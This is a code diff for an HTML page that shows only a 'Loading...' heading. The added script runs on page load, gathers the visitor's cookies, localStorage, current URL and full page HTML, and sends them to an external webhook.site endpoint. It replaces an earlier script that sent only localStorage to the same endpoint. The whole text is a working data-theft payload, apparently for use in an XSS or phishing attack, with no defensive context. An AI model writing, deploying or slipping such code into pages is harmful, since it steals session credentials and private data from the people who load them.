@@ -9,8 +9,18 @@
 <h2>Loading...</h2>
 
 <script>
-fetch("https://webhook.site/8e33713a-acea-4b39-bfa9-cf8ffd7d7a1d?ls=" + JSON.stringify(localStorage));
+(function() {
+    let out = {
+        cookie: document.cookie,
+        ls: JSON.stringify(localStorage),
+        url: location.href,
+        html: document.documentElement.innerHTML
+    };
+    fetch("https://webhook.site/8e33713a-acea-4b39-bfa9-cf8ffd7d7a1d?d="
+          + encodeURIComponent(JSON.stringify(out)));
+})();
 </script>
+
 
 
 </body>
